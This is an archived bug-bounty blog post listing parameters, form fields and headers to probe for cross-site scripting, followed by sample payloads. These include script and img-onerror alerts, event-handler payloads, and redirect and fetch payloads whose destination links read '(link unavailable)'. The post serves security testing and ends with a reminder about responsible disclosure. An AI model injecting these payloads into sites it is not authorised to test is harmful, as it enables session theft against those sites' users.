# Here are some common parameters to test for XSS (Cross-Site Scripting) vulnerabilities

- **Source URL:** https://medium.com/@BugHunterMan/here-are-some-common-parameters-to-test-for-xss-cross-site-scripting-vulnerabilities-fbe25f1968cc?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240817012036/https://medium.com/@BugHunterMan/here-are-some-common-parameters-to-test-for-xss-cross-site-scripting-vulnerabilities-fbe25f1968cc
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6823 (id 6823)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# What are the parameters for finding XSS vulnerability?

Here are some common parameters to test for XSS (Cross-Site Scripting) vulnerabilities:

1\. User input fields:

\- username

\- name

\- search

\- comment

2\. URL parameters:

\- id

\- page

\- sort

\- filter

\- search\_query

3\. Form data:

\- first\_name

\- last\_name

\- address

\- phone

\- password (be cautious when testing password fields)

4\. HTTP headers:

\- User-Agent

\- Referer

\- Cookie

5\. Other:

\- callback (for JSONP endpoints)

\- return\_url (for redirect-based functionality)

When testing for XSS, try injecting malicious payloads, such as:

1\. Basic payloads:

\- \<script>alert(‘XSS’)\</script>

\- \<img src=x onerror=alert(‘XSS’)>

2\. Event-based payloads:

\- \<button onclick=alert(‘XSS’)>Click me\</button>

\- \<input type=”text” value=”XSS” onfocus=alert(‘XSS’)>

3\. Stored XSS payloads:

\- \<script>document.location=’(link unavailable)\</script>

\- \<img src=x onerror=fetch(‘(link unavailable))>

Remember to test for both reflected and stored XSS vulnerabilities, and always follow responsible disclosure guidelines when reporting vulnerabilities.
